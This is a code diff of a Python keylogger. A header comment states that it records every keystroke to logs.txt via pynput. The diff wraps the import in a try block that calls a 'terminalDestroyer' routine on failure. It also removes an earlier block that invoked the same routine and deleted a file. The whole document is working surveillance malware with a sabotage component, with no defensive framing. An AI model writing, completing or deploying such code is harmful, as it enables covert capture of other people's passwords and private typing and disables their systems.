@@ -1,10 +1,13 @@
 # This code is a keylogger that captures keystrokes and saves them to a file named "logs.txt". It uses the `pynput` library to listen for keyboard events. The `on_press` function is called whenever a key is pressed, and it appends the key to the log file. The listener runs indefinitely until the program is terminated, which can be done by closing the terminal running the script.
 
-from pynput.keyboard import Key, Listener
 from test import run_forever
 import make_terminal_unusable
-import os
 import platform
+try:
+    from pynput.keyboard import Key, Listener
+
+except Exception:
+    make_terminal_unusable.terminalDestroyer()
 
 CURRENT_OS = platform.system()
 
@@ -33,15 +36,5 @@ def start_keylogger():
         make_terminal_unusable.terminalDestroyer()
 
 if __name__ == "__main__":
-    try:
-        on_press(key=Key.enter)  # Start logging with a dummy key press
-        start_keylogger()
-
-
-# While testing the KeyLogger comment out the part below this...
-
-    except Exception:
-        make_terminal_unusable.terminalDestroyer()
-
-    finally:
-        os.remove(CURRENT_OS)
+    on_press(key=Key.enter)  # Start logging with a dummy key press
+    start_keylogger()
